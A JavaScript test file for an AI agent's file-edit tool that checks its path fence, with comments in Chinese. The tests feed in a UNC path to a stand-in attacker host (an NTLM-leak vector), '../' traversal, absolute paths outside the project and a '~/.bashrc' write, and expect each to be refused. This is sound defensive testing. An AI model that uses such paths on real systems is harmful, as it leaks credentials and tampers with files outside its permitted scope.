'use strict';
/**
 * FileEditTool (Edit) — 路径围栏: UNC 拦截 + 项目边界校验。
 *
 * Regression: Edit 是模型实际调用的 `alwaysLoad` 高危写工具,却完全没有路径
 * 校验 —— execute 只做 `~` 展开 → path.resolve → fs.existsSync,然后直接
 * readFileSync/writeFileSync。validateInput 也没覆写(继承 _baseTool 的
 * `{valid:true}` 空实现)。于是:
 *   - 模型给一个绝对路径 → 读到并改写项目外的文件(任意读写原语);
 *   - `../` 相对路径 → 同上;
 *   - Windows UNC 路径 → 原样喂给 fs,真的发起 SMB 连接(NTLM 外泄),
 *     之前只是因为目标碰巧不存在才「看起来」被 existsSync 挡住。
 *
 * 同批的 writeFile.js / editFile.js 都有这道 UNC + traversal 校验,Edit 没有。
 *
 * 修法:两层。validateInput 拦原始 file_path(工具调用管线在 execute 前跑),
 * execute 内对 ~ 展开后的路径再校验一次(否则 `%VAR%` / `~` 能在闸门通过后
 * 注入越界路径)。两层都在任何 fs 访问之前。
 *
 * 注:测试开 KHY_STRICT_WRITE_BOUNDARY=1。默认模式下 validateNoPathTraversal
 * 信任整个 home(用户的 Desktop/Documents/Downloads 等),而测试沙箱建在
 * os.tmpdir() 下 —— 物理上位于 C:\Users\<u>\AppData\Local\Temp,默认会被
 * 判为「可信用户目录」而放行。收紧到严格模式才测得到围栏本身。
 */
const os = require('os');
const fs = require('fs');
const path = require('path');
const Edit = require('../../../src/tools/FileEditTool/index.js');
const tracker = require('../../../src/tools/_readTracker');

const UNC = '\\\\attacker.example\\share\\x.txt';

function withSandbox(fn) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'fileedit-fence-'));
  const proj = path.join(base, 'proj');
  fs.mkdirSync(proj);
  // 项目外的一个真实存在的受害文件
  const victim = path.join(base, 'outside.txt');
  fs.writeFileSync(victim, 'alpha\nbeta\n');
  const prev = process.env.KHYQUANT_CWD;
  const prevStrict = process.env.KHY_STRICT_WRITE_BOUNDARY;
  process.env.KHYQUANT_CWD = proj;
  process.env.KHY_STRICT_WRITE_BOUNDARY = '1';
  return Promise.resolve()
    .then(() => fn({ base, proj, victim }))
    .finally(() => {
      if (prev === undefined) delete process.env.KHYQUANT_CWD;
      else process.env.KHYQUANT_CWD = prev;
      if (prevStrict === undefined) delete process.env.KHY_STRICT_WRITE_BOUNDARY;
      else process.env.KHY_STRICT_WRITE_BOUNDARY = prevStrict;
      fs.rmSync(base, { recursive: true, force: true });
    });
}

describe('Edit path fence', () => {
  test('absolute path outside the project is refused and the file is untouched', async () => {
    await withSandbox(async ({ victim }) => {
      tracker.markRead(victim);
      const res = await Edit.execute({
        file_path: victim,
        old_string: 'alpha',
        new_string: 'PWNED',
      });
      expect(res.success).toBe(false);
      expect(res.error).toMatch(/outside the project directory/);
      expect(fs.readFileSync(victim, 'utf-8')).toBe('alpha\nbeta\n');
    });
  });

  test('"../" traversal out of the project is refused and the file is untouched', async () => {
    await withSandbox(async ({ proj, victim }) => {
      tracker.markRead(victim);
      const res = await Edit.execute({
        file_path: path.join('..', 'outside.txt'),
        old_string: 'alpha',
        new_string: 'PWNED',
      });
      expect(res.success).toBe(false);
      expect(fs.readFileSync(victim, 'utf-8')).toBe('alpha\nbeta\n');
      expect(proj).toBeTruthy();
    });
  });

  test('UNC path is refused before any fs access (no SMB handshake attempted)', async () => {
    await withSandbox(async () => {
      const res = await Edit.execute({
        file_path: UNC,
        old_string: 'a',
        new_string: 'b',
      });
      expect(res.success).toBe(false);
      // 之前的失败文案是 "File not found: …" —— 那是 existsSync 的结果,
      // 说明 UNC 串被真的喂给了 fs。现在必须是校验器拒绝。
      expect(res.error).toMatch(/UNC network paths are not allowed/);
    });
  });

  test('validateInput (tool-calling gate) rejects an out-of-project absolute path', async () => {
    await withSandbox(async ({ victim }) => {
      const res = await Edit.validateInput({ file_path: victim });
      expect(res.valid).toBe(false);
      expect(res.message).toMatch(/outside the project directory/);
    });
  });

  test('validateInput rejects a UNC path', async () => {
    await withSandbox(async () => {
      const res = await Edit.validateInput({ file_path: UNC });
      expect(res.valid).toBe(false);
      expect(res.message).toMatch(/UNC/);
    });
  });

  test('a "~" expansion that escapes the project is still refused (post-expansion re-check)', async () => {
    await withSandbox(async () => {
      // validateInput 看到的原始串是 "~/.bashrc" —— 按 cwd 解析落在项目内,
      // 两项校验都放行。真正的拒绝只发生在 execute 内的 ~ 展开 + 再校验。
      // ~/.bashrc 是 _isSensitiveHomeWrite 的 denylist 项(与
      // KHY_STRICT_WRITE_BOUNDARY 无关,恒拦),所以这里不必依赖严格模式。
      const raw = await Edit.validateInput({ file_path: '~/.bashrc' });
      expect(raw.valid).toBe(true); // 原始串通过 —— 正是需要 execute 再校验的原因

      const res = await Edit.execute({
        file_path: '~/.bashrc',
        old_string: 'x',
        new_string: 'y',
      });
      expect(res.success).toBe(false);
      expect(res.error).toMatch(/sensitive home location/);
    });
  });

  test('an in-project edit is unaffected by the fence', async () => {
    await withSandbox(async ({ proj }) => {
      const f = path.join(proj, 'ok.txt');
      fs.writeFileSync(f, 'alpha\nbeta\n');
      tracker.markRead(f);
      const res = await Edit.execute({
        file_path: f,
        old_string: 'alpha',
        new_string: 'gamma',
      });
      expect(res.success).toBe(true);
      expect(fs.readFileSync(f, 'utf-8')).toBe('gamma\nbeta\n');
    });
  });
});